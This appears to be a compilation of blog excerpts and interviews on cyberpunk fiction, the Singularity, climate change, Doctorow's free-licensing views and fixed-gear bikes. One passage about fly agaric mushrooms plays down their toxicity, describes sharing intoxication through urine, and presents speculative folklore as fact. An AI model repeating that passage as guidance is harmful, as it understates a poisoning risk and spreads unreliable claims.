In a world lacking nothing , Brunner laments our lack of purpose ; he proposes that Western civilization , while saturated with intelligence , has forsaken actual wisdom , setting the stage for collective psychosis and a depersonalized ruling elite .
Prefiguring the online free speech movement , Brunner shows how a technocratic society can use information for good or ill and , moreover , suggests ways individuals can make the future more user - friendly .
" The Shockwave Rider , " lamentably not as well - known as " 1984 " or " Brave New World , " is one of the central social thought experiments of the 20th century -- and an effective rallying call for sanity in a world that , now more than ever , often seems like so much digital putty .
If The Shockwave Rider had been published a decade after its 1975 copyright date , there is no doubt it would have been lumped into that shifting , slippery , semi - solid body of work now called cyberpunk .
But since it appeared in a time before the term " cyberpunk " had been coined , this novel was merely seen as a one - off about a future subsumed by data , corporations and the government .
While it was not a commercial success , it did receive some critical note and it also became an underground hit in the high - tech community then evolving around computers .
Historical Note :
In the 1980s , researchers at Xerox PARC dubbed the first self - replicating , self - propagating computer program a " worm " after the " tapeworms " Nickie uses to erase his previous identities .
But while The Shockwave Rider missed cashing in on the cyberpunk cachet , it nevertheless remains an important work .
Brunner 's hard - luck , gritty street - kid - cum - data - jockey foreshadowed the dozens of such anti-heroes that would appear in the 1980s .
And his portrayal of a society enmeshed in data overload could , as the saying goes , be taken out of today 's headlines .
More than that , The Shockwave Rider is also a good tale , artfully told .
Although it 's slow ( and perhaps a bit confusing ) to start , the book quickly hits its pace and continues marching unrelentingly until the end , drawing readers along with it .
By the end of the book readers will have a keen sense of , if not the future at least a future , and what the role of both humanity as a whole and the individual as a piece might be in that future .
It 's a story as enjoyable and profound today as it was 22 years ago , and it 's absolutely a must read for cyberpunk aficionados .
" For all the claims one hears about the liberating impact of the data - net , the truth is that it 's wished on most of us a brand - new reason for paranoia . "
-- John Brunner , " The Shockwave Rider " , 1975 . ...
To Brunner , control is control of information ; either digital data or genetic code .
Governments may use information to keep a lock on society , but individuals may take find power for themselves as well by controlling and manipulating information .
The powers that be have access to the data - net , but " in theory everyone does , given a dollar to drop into a pay phone " .
Brunner identified himself with the political left ( including anti-war actions in Britain during the sixties ) but when he 's read today , his outlook seems so much more concerned with the rights and dignity of the individual , rather than trying to social - engineer whole societies .
This spirit is very much the " Internet ethos " we see today .
...
This book has always been popular with the techy - geeky crowd , but , since it was first published in the ' 70s , it missed out on the cyberpunk revolution of the ' 80s .
It 's too bad , because this is a compelling story of a future world tied together by a universal data network , a world that could be our tomorrow .
It 's a tense place filled with information overload and corporate domination , and nearly everything is known about everybody .
Except Nickie Haflinger , a prodigy whose talents allow him to switch identities with a phone call .
Nickie plans to change the world , if only he can keep from getting caught .
This 28 - year old book not only decribed the internet as it will become very soon long before its inception , but computer viruses ( called " worms " by Brunner ) before the first PC too , plus a few other things and issues not even mentioned yet .
Since a friend gave it to me to read many years ago , I 've bought every copy of it I could find .
I have kept one German and one English version and as I will not let them out of my bookshelf under no circumstances I gave all others away as gifts , still looking for more copies to give away .
It has been sold out so often and for such a long time , each time and in each of those two languages available to me , that if one were to be a follower of conspiracy theories , well , the fact that this book is not reprinted as often as some other books of Brunner are would be reason for suspicion .
As the 20th century draws to a close , the " global warming ; fact or fiction ? " debate , and the international political paralysis over appropriate action , continues .
Skeptics ( some legitimate , some hired guns of fossil fuel - dependant industries ) insist that the available data is insufficient to conclude that humans are affecting the climate .
Meanwhile , the ten warmest years on record have occurred in the past fifteen years and the 1990s have already been warmer than the 1980s -- the warmest decade on record -- by almost 0.2 F ( 0.1C ) .
On the storm front , NOAA reports that the period from 1995 - 1998 had a total of 33 hurricanes -- an all - time record , with 1998 being one of the deadliest storm seasons in history and 1999 predicted to be its equal .
El nino , la nina , 500 year floods , record droughts , and the litany continues .
Whether or not humans are the cause , it is difficult to deny that climate and weather are becoming increasingly tumultuous .
And what about the long - range forecast ?
Bruce Sterling provides a slice of future , thirty years down the line , in Heavy Weather .
The low - lying coastal expanses , once the world 's most populous and productive areas , are largely underwater .
Heat , drought , and extreme storms make other regions , including the United States Midwest , virtually uninhabitable .
Government relief agencies , powerless to do anything else , supply weather refuges with disposable paper coveralls , government - issue granola , and " happy talk news " of lottery winners and starlet weddings .
...
Bruce Sterling 's Heavy Weather is a engaging yarn about storm chasers of the future living outlaw - esque lives of high tech nomadic freedom on the Texas plains .
The great tornado pursuit plot , spiced with international conspiracy , showcases a landscape decimated by climatic change and decades of land mismanagement .
By narrating alternately through Janey 's insider passion and Alex 's fish - out - of - water viewpoint , Sterling creates an evocative picture of weather and life in the 2030s , liberally laced with geo-political insights and ecological object lessons .
Heavy Weather is a snap - shot of a possible near future , and a warning that we are shaping tomorrow 's weather , and world , today .
Thoroughly enjoyable , Heavy Weather is consummate Bruce Sterling .
The environmental movement can be boring , strident , depressing ; this is why I never quite became an environmental activist despite my initial interest and commitment in the sixties .
It struck me as too burlap and granola .
It felt reactionary ( despite the great calendars ) .
I think Bruce Sterling found himself in a similar quandary when , after researching Heavy Weather , he realized there was a significant climate problem .
Who was going to take it on ?
Certainly not the Sierra Club , the Audubon Society , the Wilderness Conservancy , organizations cycling cash and promoting the great outdoors but not equipped to generate real soltuions to a problem like global warming .
And certainly not the U.S. and other governments , whose attitudes are reflected by the Murray Hamilton character in the movie " Jaws . "
Lifesaving solutions are fine , but they have to wait til the tourist season is past .
Sterling figured design movements like futurism and dadaism had been effective in disrupting the lazier aspects of our consciousness and perception and driving new ways of thinking about the world and its problems , so he started the Viridian Design movement , beginning with the Manifesto of January 3 , 2000
We have a worldwide environmental problem .
This is a truism .
But the unprecedentedly severe and peculiar weather of the late 1990s makes it clear that this problem is growing acute .
Global warming has been a lively part of scientific discussion since at least the 1960s , but global warming is a quotidian reality now .
Climate change is shrouding the globe in clouds of burning rain forest and knocking points off the GNP of China .
Everyone can offer a weird weather anecdote now ; for instance , I spent a week this summer watching the sky turn gray with fumes from the blazing forests of Chiapas .
The situation has been visibly worsening , and will get worse yet , possibly very much worse .
Society has simply been unable to summon the political or economic will to deal successfully with this problem by using 20th century methods .
That is because CO2 emission is not centrally a political or economic problem .
It is a design and engineering problem .
It is a cultural problem and a problem of artistic sensibility .
New and radical approaches are in order .
These approaches should be originated , gathered , martialled into an across - the - board cultural program , and publicly declared -- on January 3rd
WorldChanging is one spinoff from the Viridian work , which continues apace at http://www.viridiandesign.org/.
It 's worthwhile to reread the Viridian agenda at the end of the manifesto ... which I duplicate here , encouraging comments and suggestion from today 's perspective - six years later , post 9/11 , post Katrina .

The Trend : " Big Science " dwindles into short - term industrial research or military applications ; " scientists " as a class forced to share imperilled , marginal condition of English professors and French deconstructionists .
I would like to conclude by suggesting some specific areas for immediate artistic work .
I see these as crying public needs that should be met by bravura displays of raw ingenuity .
This remarkable anthology reprints Hugo winner Vinge 's ( The Collected Stories of Vernor Vinge ) " True Names " ( 1981 ) , the story that began SF 's cyberpunk revolution , with 11 essays showing its effect on science as well as fiction .
The best are the testimonials by pioneers in virtual reality , cryptography and artificial intelligence .
The most famous contributors , Marvin Minsky and Danny Hillis , also show the deepest understanding of Vinge 's vision .
The weakest pieces are science - fictional , appearing pale in the shadow of Vinge 's story .
The overall problem with the collection is its wildly unbalanced political stance .
A quarter of the essayists are " crypto-anarchists , " who see the ability of individuals to act secretly as the only defense against a totalitarian surveillance state .
Vinge , who was one of the first science fiction writers to conceive of cyberspace , formalized these ideas in an essay written for NASA in 1993 and published later that year in the Whole Earth Review .
The article noted several trends that together or separately might lead to the Singularity : artificial intelligence , which could lead to " computers that are " awake ' and superhumanly intelligent " ; computer networks that achieve such intelligence ; human - computer interfaces that " become so intimate that users may reasonably be considered superhumanly intelligent " ; and biological improvements to the human intellect .
" Within thirty years , we will have the technological means to create superhuman intelligence , " Vinge predicted , adding somewhat ominously that " shortly after , the human era will be ended . "
A number of Vinge 's novels , including Marooned in Realtime ( 1986 ) and A Fire Upon the Deep ( 1992 ) , have dealt obliquely with the concept , typically by telling the stories of human beings who have escaped , one way or another , the Singularity 's explosive transformations .
But in his most recent book , last year 's Rainbows End ( just out in paperback from Tor ) , Vinge comes toe to toe with imminent change .
Humanity , within a couple of decades of the present day , is on the brink of something transformational - or else on the brink of destruction - in large part because almost everyone is connected , usually via wearable computers , to tomorrow 's In- ternet .
The result is a struggle between those who would hobble our independence to make us safer and those who are willing to risk skirting the edge of destruction to see where the Singularity takes us .
It 's just the quality of speculation you 'd expect from an author whose previous novel , A Deepness in the Sky ( 1999 ) , won not only a Hugo Award but also a Prometheus Award for the best libertarian novel of the year .
Vinge is a mathematician and computer scientist as well as a novelist ; he is now retired from his faculty position at San Diego State University to a life of writing , lecturing , and consulting .
Contributing Editor Mike Godwin interviewed him , in part via email , in the weeks following his appearance last year as a guest of honor at the 16th annual Computers , Freedom & Privacy conference in Washington , D.C.
At that conference Vinge spoke about both the Singularity and a " convergence " of technological trends that threaten to drastically limit individual freedom .
Reason :
In your speech you foresaw efforts to build ubiquitous monitoring or government controls into our information technology .
What 's more , you suggested that this was n't deliberate - that the trend is happening regardless of , or in spite of , the conscious choices we 're making about our information technology .
Vernor Vinge : I see an implacable government interest here , and also the convergence of diverse nongovernmental interests - writers unions , Hollywood , " temperance " organizations of all flavors , all with their own stake in exploiting technology to make people " do the right thing . "
Reason :
Do you believe this pervasive monitoring and / or control might stall the Singularity ?
Vinge : I think that if the Singularity can happen , it will .
There are lots of very bad things that could happen in this century .
The Technological Singularity may be the most likely of the noncatastrophes .
Except for their power to blow up the world , I think governments would have a very hard time blocking the Singularity .
The possibility of governments perverting the Singularity is somewhat more plausible to me .
( Who wrote the story with the newspaper headline " Today Parliament Met and Abolished the People " ? )
In A Deepness in the Sky the Singularity did n't happen , but not because of governments .
On the other hand , A Deepness in the Sky showed how government could use technology to create a whole new level of tyranny .
But in my speech , I also wanted to raise the possibility that these abuses may turn out to be irrelevant .
There is a national interest , and not just in America , in providing the illusion of freedom for the millions of people who need to be happy and creative to make the economy go .
Those people are more diverse and distributed and resourceful and even coordinated than any government .
Thats a power we already have in free markets .
Computer networks , supporting data and social networks , give this trend an enormous boost .
In the end that illusion of freedom may have to be more like the real thing than any society has ever achieved in the past , something that could satisfy a new kind of populism , a populism powered by deep knowledge , self - interest so broad as to reasonably be called tolerance , and an automatic , preternatural vigilance .
...
Sterling noted that the first stating of the Singularity metaphor and threat came from John Von Neuman in the 1950s in conversation with Stan Ulam - --" the rate of change in technology accelerates until it is mind - boggling and beyond social control or even comprehension . "
But it was science fiction writer Vernor Vinge who first published the idea , in novels and a lecture in the early 1980s , and it was based on the expectation of artificial intelligence surpassing human intelligence .
Vinge wrote : " I believe that the creation of greater than human intelligence will occur during the next thirty years .
I 'll be surprised if this event occurs before 2005 or after 2030 . "
Vinge was not thrilled at the prospect .
The world - changing event would happen relatively soon , it would be sudden , and it would be irrevocable .
" It 's an end - of - history notion , " Sterling drawled , " and like most end - of - history notions , it is showing its age . "
It 's almost 2005 , and the world is still intelligible .
Computer networks have accelerated wildly , but water networks have n't --- in fact we 're facing a shortage of water .
The Singularity feels like a 90s dot - com bubble idea now --- it has no business model .
" Like most paradoxes it is a problem of definitional systems involving sci- fi handwaving around this magic term ' intelligence . '
If you fail to define your terms , it is very easy to divide by zero and reach infinite exponential speed . "
It was catnip for the intelligentsia : " Wow , if we smart guys were more like we already are , we'd be godlike . "
Can we find any previous Singularity - like events in history ?
Sterling identified three --- the atomic bomb , LSD , and computer viruses .
The bomb was sudden and world changing and hopeful --- a new era !
LSD does FEEL like it 's world changing .
Viruses proliferate exponentially on the net .
LSD is pretty much gone now .
Mr. Atom turned out to be not our friend and has blended in with other tools and problems .
Singularity proponents , Sterling observed , are organized pretty much like virus writers --- loose association , passionate focus , but basically gentle .
( They 'd be easily rounded up . )
" They do n't have to work very hard because they are mesmerized by the autocatalyzing cascade effect .
' Never mind motivating voters , raising funds , or persuading the press ; we 've got a mathematician 's smooth line on a 2D graph !
Why bother , since pretty soon we 'll be SUPERHUMAN .
It 's bound to happen to us because we are EARLY ADAPTERS . ' "
Vernor Vinge wrote : " For me , superhumanity is the essence of the Singularity .
Without that we would get a glut of technical riches , never properly absorbed . "
Said Sterling , " A glut of technical riches never properly absorbed sounds like a great description of the current historical epoch . "
Sterling listed five kinds of kinds of reactions to the Singularity .
1 ) Do n't know and do n't care ( most people ) .
2 ) The superbian transhumanists .
3 ) The passive singularitatians --- the Rapture of the Nerds .
4 ) The terrified handflapping apocalypse millennialists ( a dwindling group , too modish to stay scared of the same apocalypse for long ) .
5 ) The Singularity resistance --- Bill Joy killjoys who favor selective relinquishment .
Sterling turned out to be a fellow traveler of the Resistance : " Human cognition becoming industrialized is something I actually worry about . "
Vinge did a great thing , said Sterling .
The Singularity has proved to be a rich idea .
" In the genre of science fiction it is more important to be fruitfully mistaken than dully accurate .
That 's why we are science fiction writers , not scientists . "
Jack Womack , one of the people who 's been privy to the material and process throughout , offers the following take on it :
Spook : as spectre , ghost , revenant , remnant of death , the madness lingering after the corpse is sloughed off .
Slang for intelligence agent ; agent of uncertainty , agent of fear , agent of fright .
Country : in the mind or in reality .
The World .
The United States of America , New Improved Edition .
What lies before you .
What lies behind .
Where your bed is made .
Spook Country : the place where we have all landed , few by choice , and where we are learning to live .
The country inside and outside of the skull .
The soul , haunted by the past , of what was , of what might have been .
The realization that not all forking paths are equal -- some go down in value .
The ground of being , pervaded with spectres .
The ground of actuality , similarly teeming .
In traversing spook country , we ourselves have been transformed , and we will not fully understand how until we are no longer what we were .
Word from the Croisette has some of our posters gnashing their teeth at the possibility that someone who 's made Britney vids might attempt a feature film of Neuromancer .
Discussing said possibility , earlier today , with Cory Doctorow , he said :
" I 've noticed that everything in Hollywood always appears to be in a liminal state of nearly there , with enormous , gallumphing enthusiasm all around , then long periods of indifference .
I get almost weekly calls about the amazing things that are just about to happen for me .
I go to studio meetings with people who tell me about the amazing things we 'll do together .
Somehow , nothing much comes of it ...
It reminds me a little of bubble - era tech entrepreneurs , especially the business development people who always seemed about to close a GIANT DEAL . "
If you 're a novelist , or hope one day to be , and have n't yet had a film option , I suggest you remember that .
It 's as concise and accurate a description of this very liminal business as you 're ever likely to run across .
Myself , I 'll be willing to entertain the idea that Neuromancer is really " headed for the big screen " when I 'm watching it being shot .
As the old saying goes , I 'll believe it when I see it .
I * do* believe , though , that Peter Weir will not be going forward with Pattern Recognition .
That is one utterly solid little factoid of film news , alas .
I no longer get very wrought up over the liminals , myself , except to be annoyed by people who seem to assume that feature films are the ultimate stage of novelistic creation , thereby relegating the book to the status of dull gray chrysalis .
Tachyon Publications has posted the Table of Contents for their " Rewired : The Post - Cyberpunk Anthology " ( edited by James Patrick Kelly and John Kessel ) , and it's a killer line - up :
* Introduction : Hacking Cyberpunk by James Patrick Kelly and John Kessel

* Bruce Sterling " Bicycle Repairman "
* Gwyneth Jones " Red Sonja and Lessingham in Dreamland "
* Jonathan Lethem " How We Got Into Town and Out Again "

That second " introduction " is actually a series of letters between Bruce Sterling and John Kessel starting in 1985 , which sounds like it's about the heart of the cyberpunk - humanist split .
I had n't even suspected such a thing existed , and I can't wait to read it myself .
WHEN is a bicycle not like other bicycles ?
To begin with , when it has no brakes , or at least no visible brakes , or possibly just a front brake .
That means you can't ride this bike very well on your first try , and certainly not very gracefully , easily or safely .
The rear cog is bolted directly to the hub , so that whenever the vehicle is in motion , the pedals go around , making coasting impossible .
This bike does n't have a shift lever or extra sprockets , and the chain is shorter and wider than on traditional bikes .
There are no fenders , and the rear wheels are probably bolted onto the frame to deter theft .
You slow down by reversing the pedals , or skidding , or doing a skip stop .
And that 's just the beginning of the differences between your run -of - the - mill 10 - speed and a track bike , or fixed - gear bike ( fixie for short ) as it is also known .
Many fixed - gear adherents contend that their bikes are the ultimate and all others are pretenders .
And these fixed - gear zealots are a growing presence on the streets of New York .
Perceived by some as nuisances , or as troublesome , anarchist Dumpster - diving punks who happen to ride bikes , they are occasionally reviled , but they are also the subject of curiosity and interest .
Just as die - hard skateboarders 15 years ago stood on the cusp of providing a new lifestyle , so the fixed - gear bike culture could be the tip of something that nobody can accurately predict but something that is huge .
Riders of fixed - gear bikes are as diverse as bike riders in general .
Messengers are big fixie aficionados , but more and more fixed - gear bikes are being ridden by nonmessengers , most conspicuously the kind of younger people to whom the term ' hipster ' applies and who emanate from certain neighborhoods in Brooklyn .
You see these riders weaving in and out of traffic without stopping , balancing on the pedals at a stoplight and in the process infuriating pedestrians and drivers alike .

Fly Agarics are the famous red-capped , white - spotted ( yellow spotted in North America ) mushrooms of Siberian shamanism .
Often characterised as deadly poisonous in mycology guides , the mushrooms are known to cause a range of distortions .
They can make objects in the world seem much bigger or smaller , an effect lewis Carroll had incorporated into Alice In Wonderland ( it is unknown whether Carroll had personal knowledge of the " bemushroomed " state ) .
Gordon Wasson argued that Amanita was the Soma of the Rig Veda .
Here is how Fly Agarics inspired the Santa Claus legend :
In Siberia , the mushrooms were rare and extremely valuable - apparently one mushroom could cost the same as a reindeer .
Ibotenic acid and the other active ingredients of the mushroom concentrate in urine , and up to seven or eight people can share the intoxication by passing along their piss .
Many Siberian tribesmen even preferred ingesting the piss as it caused less gastric distress .
Reindeer also loved to drink the mushroom scented - piss .
All a Siberian nomad had to do wa pour a bit of his piss on the ground and reindeer would come galloping over from miles around .
This archaic , symbiotic relationship - reindeer , red and white capped beings bringing gifts from the other world , the frozen tundra - was incorporated , consciously or not , into the story of Santa Claus .
I took out the beer , turned around , and across the kitchen there were three huge mushrooms staring at me - a five foot tall , a four foot tall , and a three foot tall mushroom .
The mushrooms were red and yellow and they had little eyes and little mouths .
They looked just as solid and real as me or you .
Robert and the mushrooms stared at each other , until the largest asked , " Why did you eat us ? "
Robert thought , and then replied , " I was just following my dream . "
The mushrooms conferred with each other .
Finally they seemed satisfied by his answer .
" But are you prepared to follow this path ? " the tallest Fly Agaric asked .
Robert answered , intuitively and without hesitation , " Yes I am . "
Whereupon the mushrooms vanished .
Fifteen years passed before Robert realized that the path he had agreed to follow was plant shamanism .
A friend of Robert 's who also ate Fly Agarics received a similar visitation , and was also asked " Why did you eat us ? "
But he answered , " I was trying to get high . "
The mushrooms told him , " Well , if you ever do this again , we 're going to kill you . "
The Shockwave Rider is the culmination of Brunner 's near future prescience .
Written in the early seventies , he explicitly acknowledges Alvin Toffler 's Future Shock - an influential discussion of the change brought on by technology - though Brunner had already published a number of novels on the catastrophic effects of humanity 's approach to the world and each other .
The difference with this work is the far closer focus on North America and the decision to drive the plot through a single central character .
The book continues to use the cut - up style Brunner had developed , with a variety of techniques used to offer other viewpoints , but this is essentially the story of Nicky Haflinger , a brilliant individual attempting to transform the " plug - in society " .
The social etiquette of American society in this book expects everyone to move from one job to another and across the country once or twice a year .
The rapid , repeated changes result in disconnection from any sense of genuine community and a tendency to make belongings and relationships interchangeable - a plug - in society .
The inability of the average person to cope with this rate of change and the resulting loss of loyalty , commitment and real relation is solved by the use of drugs - primarily prescription tranquillisers which ameliorate the continual shocks of life .
A comprehensive communications network , which started as a corollary to this mobile society has become central to its continuance , storing vast detail of each individual in the databanks .
Such use of and reliance on computer data leads to the central paranoia of this world - a fear of what the records might contain and what might be used to your detriment by someone who has better access to data .
In a world where no one is more than the sum of their computer records , Haflinger 's ability to re-engineer his persona through reprogramming the data banks allows him to escape the government agencies and sample lifestyles at many levels of society .
However , much of the story is framed as an interrogation so it is clear that his capture is inevitable .
The extant powers fear his skill and the potential it has to give him great power .
Yet , Haflinger 's journey is not a search for power but for wisdom .

If moving to the US tends to put people at risk for psychological afflictions , clearly a strange cultural malaise is at work .
And the problem appears to be getting worse .
Social epidemiologist Myrna Weissman at Columbia University , along with a lengthy list of collaborators , has explored this question in detail , looking at the US as well as other countries .
Reporting in 1992 and 1996 in JAMA - the Journal of the American Medical Association - Weissman and colleagues found that more and more Americans are becoming depressed , they are getting depressed at a younger age , and the severity and frequency of depression is rising .
These results are neither small nor spurious .
Each generation born in the twentieth century has suffered more depression than the previous one and since WWII , the overall rate of depression has more than doubled .
A more recent study , published in the Archives of General Psychiatry in 2000 and conducted by another team of researchers , showed more than a doubling of depression in women from 1970 to 1992 .
Psychiatric drug use has skyrocketed as a result .
American schoolchildren today are taking four times as many psychiatric meds as all of the rest of the world combined .
What 's going on ?
The commonly sold narrative is that every instance of the blues , and certainly every case of clinical depression , is the result of some in - born biochemical imbalance - treatable only by serotonin drugs like Prozac .
Yet these studies make it clear that something larger is at play .
If your brain is indeed out of balance , the source of the trouble may very well reside in your cultural environment , not in your genes .
Last night was our inaugural reading at the Variety Preview Room , with Cory Doctorow and Rudy Rucker each reading , followed by a panel discussion and a signing .
Cory Doctorow read a chapter from his upcoming hacker - vs - the - DHS novel Little Brother , which will be coming out next May .
Rudy Rucker read from his short story regarding how Alan Turing , after eluding MI5 in order to have a tryst with his male lover , really died .
Interviewing Cory Doctorow is easy .
You just flip the on switch by asking the first question , and he emits a constant stream of brilliant , insightful stuff .
Editing interviews with Doctorow is easy as well .
He generally speaks in coherent , whole sentences and frequently expresses complex ideas for some length that do n't get lost mid-paragraph .
So it 's a pleasure to present this conversation .
For those of you have been living in a non-digital cave ( actually , I rather respect that type of non-conformism ) , Doctorow is a science fiction writer , Boing Boing contributor , and the former European Affairs Director for the EFF from 2001 - 2006 .
His novels include Down and Out in the Magic Kingdom , Eastern Standard Tribe , and Someone Comes to Town , Someone Leaves Town .
Jeff Diehl joined me in this conversation with Doctorow about Overclocked : Stories of the Future Present - his new collection of short stories .
RU SIRIUS :
You make quite a prominent point about the fact that Over - Clocked is available for free under a Creative Commons license .
You also write about the good experience you 've had with this , as a writer who does want to get paid for his work .
Do you think this good experience is universal ?
Do you know if this has been studied at all ?
CORY DOCTOROW : Well , I do n't know that anyone 's done any kind of systematic study .
But my anecdotal study finds that everyone I know who 's tried giving away free books as a way of selling printed books has done it again with their next book .
So , I think that 's a pretty good sign , right ?
It worked well enough for people to do it a second time .
I guess the definition of insanity is doing something twice and expecting a different outcome .
Presumably people were happy with that first outcome .
...
RU : Let 's move on to this collection .
My favorite piece in there , and it 's deservedly the longest piece , is called " After the Siege . "
Talk a bit about the theme of that piece .
CD : Well , I went to a little family reunion in St. Petersburg , Russia .
My grandmother was born there , and her family still lives there .
When I was growing up , she always used to tell me about the war , and about being a kid living through the Siege of Leningrad .
And she would tell me how I would never understand the terrible horrors she 'd faced .
I did n't know much about the Siege of Leningrad , but my understanding was ‚Äö √Ñ√∂‚àö√ë¬¨‚àÇ it was n't anything like Auschwitz , right ?
Like , " Boy , how bad could it have been ?
You were a civil defense worker .
You were n't in a death camp . "
And a couple of years ago , on one of those long St. Petersburg days , my grandmother walked us through the streets of St. Petersburg and told us about what she saw and did during that period .
It really changed my perception of it .
I went out and read some books , most notably The 900 Days about the Siege of Leningrad .
The privation and terrors of the Siege of Leningrad can't be overstated .
It was a nine hundred day siege .
And Stalin bungled it so badly that people in Petersberg were also in bad shape .
There was starvation and cannibalism and lots of people freezing to death .
And my grandmother - this 12 - year - old girl - was digging civil defense trenches in the frozen ground ; and hauling bodies and throwing them out of fifteen story windows because they were too weak to haul them down the stairs .
She was going to apartments where people had died and throwing them down , and then scraping them up off the ground .
And she was seeing people who'd been rendered by cannibal black marketeers - who had parts of their body sliced off to sell on the black market .
They were the most amazing , incredible stories .
And it got me thinking about writing about this as an allegory .
At the same time , I 've been doing all this work on copyright and related rights with developing nations , and with what they call emerging economies like the former Soviet territories .
And these countries are getting really shafted in international copyright negotiations .
They 're being forced to sign on to these regimes that are totally out of step with what they need .
America became an industrial power by being a pirate nation .
After the American revolution , America did n't honor the copyrights or patents of anyone except Americans .
If you were a European or British inventor , your stuff could be widely pirated in America .
That 's how they got rich .
Only after America became a net exporter of copyrighted goods did it start to enter into treaties with other countries whereby American inventors and authors would be protected abroad in exchange for those foreign authors being protected in America .
But now you have these countries in Africa , in Asia , and in Eastern Europe , who are signing on to trade agreements with the U.S. where they basically promise to just take huge chunks of their GDP and export it to the U.S.
It 's a kind of information feudalism , you know ?
Info -serfs .
RU : Within the context of this book , and with the issues you 're raising , you 're not just talking about information .
I think you 're also talking about material wealth .
You 're also talking about AIDS drugs and stuff like that .
CD : Yeah , absolutely .
You know , Russia just signed onto this free trade agreement with the U.S. trade representative in which - among other things - they promised that from now on they would license all their digital media presses and subject them to government inspection .
So America , which fought a revolution over not wanting to have licensed presses , has just gone to Russia , where they 've just had a revolution over licensed presses .
And they 've imposed a requirement that they license their presses .
This is staggering , awful , apocalyptically bad policy - making on the part of both the U.S. and Russia .
Frankly , as someone who pays taxes in the U.S. , I 'm embarrassed .
So I wrote this story from the point of view of a little girl .
She 's in a utopia where they 've done what the U.S. did after the American Revolution .
They 've abandoned all international copyright and patent and trademark and knowledge goods treaties and they 're just pirating everything .
It 's in a kind of nanotech world , so if they do n't care about respecting the rights of the inventors who created it , they can make pretty much anything .
As a result , they 've become an incredibly wealthy nation in a very short period of time .
They 've been driven to this piracy by a disease that turns people into a kind of zombie .
It 's this terrible infectious disease .
And the drugs for it were very expensive .
And they had these ineffectual leaders who were co-opted by the pharmaceutical companies .
So eventually they took the last of these leaders , put them in a barrel and drove nails through it and rolled it down a hill .
( This is , in fact , how the Hungarians killed the priest who converted the animists to Christianity . )
And they put in a new Parliament that broke all ties with the industrial world and decided to pirate everything .
But a siege is laid against them .
And in the siege , the enemy infects their computers and other devices with a virus that shuts down all their nano - assemblers .
They all start to starve to death , and the zombie - ism comes back , and so on .
And it's all told from the point of view of this little girl who comes of age in this world .
It was a fun and hard story to write , and I 'm really happy with how it turned out .
It 's been picked up for a couple of the " Year 's Best " anthologies , and I 've done a podcast of it .
And I 'm talking with someone about a film deal for it .
It seems to be a lot of people 's favorites .
...
RU : Is there a particular piece of non-fiction that has recently changed your view of the way the world works ?
CD : I read a couple of really good books in the last year or so .
One is Off the Books : The Underground Economy of the Urban Poor by Sudhir Venkatesh .
It 's a serious economic , or ethnographic analysis of the underground economy in Chicago .
He 's mentioned in Freakonomics : A Rogue Economist Explores the Hidden Side of Everything .
He 's the anthropology grad student who goes and lives with crack dealers in Chicago 's South Side and writes up how the underground economy works .
And that economy goes from the ladies who make sandwiches and sell them without charging sales tax or declaring it on their income statement ; to the loan shark , the homeless guy who will sleep in your doorway and make sure that graffiti kids do n't tag it , to the crack gang and everyone in between .
It 's a fascinating book .
The other one that I really liked was by Yochai Benkler .
It 's called The Wealth of Networks : How Social Production Transforms Markets and Freedom .
It 's such a good title !
It may just be the best tech book title of the last twenty years .
It 's a book about common space peer production - the stuff that happens on Wikipedia and on blogs and with free and open source software .
It 's about how to understand that in economic terms , not as a gift economy per se , and not as an industrial economy , and not as volunteerism .
He shows it as a third mode of industrial production that is neither the kind of gift economy or volunteerism that characterizes people who volunteer at a church ; nor capitalism as we understand it , where people invest .
Rather , it is an entirely different mode of industrial production .
And I found that book really fascinating .
RU : If he describes this as a sort of alternative mode of production , does that imply that it will always co-exist with the other modes of production ?
Or do you envision the sort of Creative Commons / open source idea ever becoming a dominant mode ?
CD : Well , it may not be the case that Creative Commons / open source / free software becomes the dominant mode - although I can imagine worse futures .
But I think it 's very true that knowledge goods , by their nature , have a different economic reality from other goods .
It 's very hard to enforce exclusive rights - the right to prohibit or the right to authorize knowledge goods .
As the Motion Picture Association is discovering - in a world where we have ubiquitous networks and cheap and fast hardware - it 's really hard to stop people from copying .
I do n't know whether it 's moral or immoral to copy things - we can talk about that all day long .
I just think that it 's hard to stop it .
So if you 're a business person , your business can't be built on what you think people should do .
It should be built on what you think people will do .
And what people will do with information is copy it .
So now that we 're living in an information economy , I think we will have different kinds of production .
It may not all be sharing , Creative Commons - oriented , but I do n't think they 're going to be based on exclusion or proprietorship .
I just do n't know how you could make that work ; it just does n't seem plausible to me .
Bruce Sterling says , " The future composts the past " .
I think he 's right .
I do n't think that the future makes things disappear ; I think it builds on top of things .
Your Mars books were about terraforming Mars ; the Science in the Capital series is to some degree are about terraforming Earth ( to repair the effects of global warming ) .
What are our chances of doing either before it 's too late ?
Robinson :
We are the major force changing the surface and atmosphere of Earth now ( we 're faster than the natural processes changing it , I mean ) , so terraforming is indeed physically possible , but we 're not used to thinking of ourselves in that role .
It would require a changed paradigm , which admitted that we have become some kind of conscious " global biosphere maintenance stewards , " and that environmental thinking now ought to include an openness to at least the concept of doing things deliberately to reduce our impacts .
We have to reconceptualize wilderness as being a kind of ethical position as well as a piece of land , meaning active and conscious stewardship on our part .
This is a kind of interaction with the Earth that has been going on semi-consciously since the beginning of humankind , but now it 's become obvious , and it is a frightening thing to contemplate , because it 's a stupendously complex system and we do n't know enough to do what we now need to .
And the unintended further consequences of anything we might try are hard to predict .
Even so , we may eventually agree through the U.N. or something else to try some things , if we get desperate enough .
The crux may come if the Western Antarctic Ice Sheet begins to detach in a big way .
About a quarter of the world 's population lives very near the coastline , and the disruptions there could be so severe that we would contemplate mitigating actions .
Beyond that , I think it 's best not to put the problem as a question concerning whether we are " too late " or not , because either answer leads to a kind of non-active response : i.e. , if it 's not too late , I do n't have to change , and if it is too late , then there 's no point in changing , so either way - party on !
Also , in some sense , encompassing all life on Earth , it will never be " too late , " in that even if we trigger a mass extinction event , the surviving life would quickly fill the empty niches and evolve onward .
You can't kill life on Earth , short of toasting it in an expanding sun or whatnot .
But you can kill a lot of species , and wreck a lot of biomes , and you can probably wreck human civilization for a time , which would kill a lot of people .
So I think it 's better to think of it in terms of " do we save more or do we save less , " of the other species in particular .
Which of the global - warming fixes in the book could be accomplished right now ?
Robinson :
We could do almost everything I described in this series , although some of the actions are perhaps politically impossible ( right now ) , rather than physically impossible .
If we made the social decision to do it , we could certainly build clean - energy generation , and a clean transport system .
We could decarbonize our technology a great deal .
These are very big investments , but it 's a very big economy , and retooling our basic technology is something we 've done many times before .
It 's a business opportunity in some ways .
